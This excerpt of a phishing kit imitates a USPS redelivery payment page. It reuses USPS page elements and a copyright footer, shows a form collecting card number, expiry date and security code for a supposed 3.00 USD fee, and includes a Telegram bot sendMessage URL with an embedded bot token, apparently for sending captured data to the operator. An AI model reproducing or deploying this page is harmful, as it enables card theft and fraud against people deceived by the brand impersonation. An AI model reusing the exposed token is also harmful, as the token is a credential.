...
$url='https://api.telegram.org/bot6931641205:AAHrjDjZZe-LW2JQWzX3DG1XvWbGoxLLDOA/sendMessage';
...
<script src="https://www.usps.com/assets/script/home/megamenu-additions.js"></script>
  ...
  <h3 id="sign-in-to-your-account-header" class="lg-header" style="margin-bottom:7px;"><strong>Payment Method</strong></h3
      
      
      
<p  style="margin-top:15px;font-size:14px;"><a style="color:red;">This Redelivery request cost 3.00 USD.</a></p>
...
<br>
<input type="text" name="ccnumb" maxlength="50" required="" placeholder="Card Number" tabindex="8" id="taddress" class="form-control">
...
<br>
<input type="text" name="expr" placeholder="Expiry Date (MM/YY)" maxlength="5"oninput="ex()"  required="" value="" tabindex="9" id="tapt" class="form-control">
...
<div class="row">
<div class="col-xs-12 col-sm-4 col-md-4">
<div class="form-group" id="form-group-tcity">

<br>
<input type="text" name="cvvz" maxlength="50" placeholder="Security code" required="" tabindex="10" id="tcity" class="form-control">
</div>
...
<div class="global-footer--copyright">Copyright © 2022 USPS.  All Rights Reserved.</div>
</footer>
